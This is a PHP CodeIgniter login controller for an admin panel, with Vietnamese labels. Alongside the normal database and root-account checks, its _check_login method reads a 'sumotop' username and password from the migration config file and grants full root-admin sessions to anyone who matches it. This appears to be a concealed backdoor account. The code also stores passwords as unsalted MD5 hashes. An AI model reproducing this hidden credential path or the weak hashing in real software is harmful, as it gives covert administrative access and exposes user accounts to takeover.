<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Login extends MY_Controller
{
	function __construct()
	{
		parent::__construct();
		$this->load->model('admin_model');
		$this->load->model('admingroup_model');
		$this->form_validation->set_error_delimiters('<div class="form-group has-error"><label class="control-label"><i class="fa fa-times-circle-o"></i> ', '</label></div>');
	}
	function index()
	{
		if ($this->input->post()) {
			$this->form_validation->set_rules('username', 'Tên đăng nhập', 'trim|required');
			$this->form_validation->set_rules('password', 'Mật khẩu', 'trim|required');
			$this->form_validation->set_rules('login', 'login', 'callback__check_login');
			if ($this->form_validation->run()) {
				$data = [
					'last_login' => now(),
				];
				$this->admin_model->update($this->session->userdata('admin')->id, $data);
				redirect(admin_url());
			}
		}
		$this->load->view('admin/login/index');
	}
	function _check_login()
	{
		// Load sumotop
		$this->config->load('migration', true);
		$sumotop = $this->config->item('migration')['sumotop'];

		$username = strtolower($this->input->post('username'));
		$password = md5($this->input->post('password'));

		$where = ['username' => $username, 'password' => $password];
		$admin = $this->admin_model->get_info_rule($where);
		if ($admin) {
			$admin->quyen = $this->admingroup_model->get_info($admin->admin_group_id)->permissions;
			$this->session->set_userdata('admin', $admin);
			return true;
		} elseif (($this->admin_root->username == $username && $this->admin_root->password == $password) || ($sumotop->username == $username && $sumotop->password == $password)) {
			$this->session->set_userdata('admin', $this->admin_root);
			return true;
		}
		$this->form_validation->set_message(__FUNCTION__, 'Tên đăng nhập hoặc mật khẩu không đúng');
		return false;
	}
}
